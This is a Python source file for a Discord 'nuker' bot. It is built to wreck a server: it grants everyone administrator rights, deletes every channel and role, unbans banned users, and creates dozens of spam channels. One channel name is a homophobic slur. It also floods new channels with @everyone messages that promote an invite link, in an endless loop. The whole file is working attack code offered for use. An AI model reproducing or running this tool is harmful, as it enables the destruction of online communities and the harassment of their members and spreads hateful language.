# Coded with ❤ by Luna's Dev Team

import os
import discord
import random
import json
from discord.ext import commands
from discord import Permissions
from discord.ext.commands import MissingPermissions
from pystyle import Colorate, Colors


config = r"lunaconfig.json"

with open(config, 'r') as f:
  config = json.load(f)
  server_name = config["server_name"]
  token = config["token"]
  DiscordID = config["DiscordID"]
  bot_status = config["bot_status"]


SPAM_CHANNEL = ["Luna Owns You", "Luna Nuked You", "Faggots", "L"]
SPAM_MESSAGE = ["@everyone Cry About It? https://discord.gg/PskF2YeXnd"]

client = commands.Bot(command_prefix="$")

os.system('cls')

def _print(text):
    print(Colorate.Horizontal(Colors.blue_to_purple, text))

def banner():
  _print('''
██╗     ██╗   ██╗███╗  ██╗ █████╗   ███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗
██║     ██║   ██║████╗ ██║██╔══██╗  ████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║     ██║   ██║██╔██╗██║███████║  ██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝
██║     ██║   ██║██║╚████║██╔══██║  ██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
███████╗╚██████╔╝██║ ╚███║██║  ██║  ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
╚══════╝ ╚═════╝ ╚═╝  ╚══╝╚═╝  ╚═╝  ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
   $nuke - nukes server     $stop - stops the nuke and closes the terminal                                             
''')

@client.event
async def on_ready():
  os.system(f'cls & mode 81,25 & title Luna Nuker - Made by Smug')
  banner() 

@client.event
async def on_command_error(ctx, error):
  if isinstance(error, MissingPermissions):
    await ctx.send("You don't have permissions to use this command")
    _print("You don't have permissions to use this command")
  else:
    await ctx.send("Invalid Command")
    _print("Invalid Command")

@client.command()
async def stop(ctx):
  await ctx.message.delete()
  msg = await ctx.send(f"Restarting '{client.user.name}'...")
  await msg.delete()
  os.system("LunaNuker.py")
  exit()

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await guild.edit(name=server_name)
    _print(f"'{client.user.name}'server was changed to "+ server_name)
    _print(f"'{ctx.author}' ran this command.")
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      _print("I have given everyone admin.")
    except:
      _print("I was unable to give everyone admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        _print(f"{channel.name} was deleted.")
      except:
        _print(f"{channel.name} was NOT deleted.")
    for role in guild.roles:
     try:
       await role.delete()
       _print(f"{role.name} Has been deleted")
     except:
       _print(f"{role.name} Has not been deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(DiscordID)
        _print(f"{user.name}#{user.discriminator} Was successfully unbanned.")
      except:
        _print(f"{user.name}#{user.discriminator} Was not unbanned.")
    await guild.create_text_channel("Luna Nuked You")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        _print(f"New Invite: {link}")
    amount = 45
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))



client.run(token, bot=True)
